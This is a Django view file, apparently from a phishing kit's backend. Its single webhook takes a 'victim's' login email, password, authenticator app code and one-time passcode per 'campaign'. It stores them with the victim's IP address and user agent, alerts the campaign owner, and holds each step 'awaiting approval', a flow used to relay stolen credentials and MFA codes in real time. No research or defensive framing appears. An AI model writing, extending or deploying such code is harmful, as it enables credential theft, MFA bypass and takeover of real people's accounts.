from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse, HttpResponseBadRequest
from django.views.decorators.http import require_POST
import json
from .models import Campaign, VictimInfo, VictimEvent  # Added VictimEvent import
from accounts.models import CustomUser
from .views import send_victim_info_notification

@csrf_exempt
@require_POST
def webhook_victim_info(request, campaign_id):
    """
    Webhook endpoint to receive victim info for a specific campaign.
    Accepts partial data: only writes fields it receives.
    Merges all data into a single VictimInfo per campaign.
    Now supports approval/rejection flow.
    """
    try:
        data = json.loads(request.body.decode('utf-8'))
    except json.JSONDecodeError:
        return HttpResponseBadRequest('Invalid payload')

    try:
        campaign = Campaign.objects.get(id=campaign_id)
    except Campaign.DoesNotExist:
        return JsonResponse({'error': 'Campaign not found'}, status=404)

    # Try to get existing VictimInfo for this campaign id
    victim_info, created = VictimInfo.objects.get_or_create(
        campaign=campaign,
        defaults={'user': campaign.user}
    )

    # Log a 'visit' event if this is the first time
    if created:
        VictimEvent.objects.create(
            campaign=campaign.id,  # Use campaign ID instead of campaign object
            event_type='visit',
            ip_address=request.META.get('REMOTE_ADDR'),
            user_agent=request.META.get('HTTP_USER_AGENT', '')
        )

    updated = False
    step_submitted = None
    
    # Handle different submission fields
    if 'login_email' in data:
        victim_info.login_email = data['login_email']
        victim_info.email_status = 'pending'
        victim_info.current_step = 'email'
        step_submitted = 'email'
        updated = True
    
    if 'login_password' in data:
        victim_info.login_password = data['login_password']
        victim_info.password_status = 'pending'
        victim_info.current_step = 'password'
        step_submitted = 'password'
        updated = True
    
    if 'login_authenticator_app_code' in data:
        victim_info.login_authenticator_app_code = data['login_authenticator_app_code']
        victim_info.authenticator_status = 'pending'
        victim_info.current_step = 'authenticator'
        step_submitted = 'authenticator'
        updated = True
    
    if 'login_otp' in data:
        victim_info.login_otp = data['login_otp']
        victim_info.otp_status = 'pending'
        victim_info.current_step = 'otp'
        step_submitted = 'otp'
        updated = True
    
    if updated:
        victim_info.save()
        # Log a 'typing' event whenever data is updated
        VictimEvent.objects.create(
            campaign=campaign.id,  # Use campaign ID instead of campaign object
            event_type='typing',
            ip_address=request.META.get('REMOTE_ADDR'),
            user_agent=request.META.get('HTTP_USER_AGENT', '')
        )
        
        # Notify campaign owner only on first submission (when VictimInfo was just created)
        if created:
            send_victim_info_notification(campaign, victim_info, request)

    return JsonResponse({
        'status': 'success',
        'victim_info_id': str(victim_info.id),
        'created': created,
        'step_submitted': step_submitted,
        'awaiting_approval': True
    })
